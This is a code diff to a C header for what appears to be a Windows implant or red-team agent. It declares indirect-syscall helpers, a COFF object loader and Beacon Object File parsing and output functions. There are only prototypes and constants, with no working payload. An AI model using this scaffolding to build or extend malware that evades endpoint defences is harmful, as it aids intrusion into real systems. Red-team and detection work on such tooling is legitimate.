@@ -56,7 +56,7 @@ PBYTE GetFuncArg( PCONTEXT pThreadCtx, DWORD dwParmIndex );
 #define RANGE       0xFF
 
 VOID SetSsn( DWORD dwSSn, PVOID pSyscallInstAddress );
-VOID RunSyscall( ... );
+VOID RunSyscall( PVOID, ... );
 BOOL FetchNtSyscall( ULONG SysHash, PSYS_TBL SysTable );
 BOOL InitNtdllConf( VOID );
 
@@ -67,3 +67,30 @@ BOOL InitNtdllConf( VOID );
         Syscall().wSystemCall = Sys.Ssn; \
     } while(0)
 // #define RUN_SYSCALL(Sys, ...)(RunSyscall((DWORD)Sys.Ssn,(PVOID)Sys.SysInsAddr, ##__VA_ARGS__))
+
+/*====================================[ Coff Loader ]====================================*/
+
+BOOL CoffLdr( PVOID Object, PSTR Function, PBYTE Args, UINT32 Argc );
+
+/* data API */
+typedef struct {
+	char* original; /* the original buffer [so we can free it] */
+	char* buffer;   /* current pointer into our buffer */
+	int    length;  /* remaining length of data */
+	int    size;    /* total size of this buffer */
+} datap;
+
+void    BeaconDataParse(datap* parser, char* buffer, int size);
+int     BeaconDataInt(datap* parser);
+short   BeaconDataShort(datap* parser);
+int     BeaconDataLength(datap* parser);
+char*   BeaconDataExtract(datap* parser, int* size);
+
+/* Output Functions */
+#define CALLBACK_OUTPUT      0x0
+#define CALLBACK_OUTPUT_OEM  0x1e
+#define CALLBACK_OUTPUT_UTF8 0x20
+#define CALLBACK_ERROR       0x0d
+
+void BeaconOutput(int type, char* data, int len);
+void BeaconPrintf(int type, char* fmt, ...);
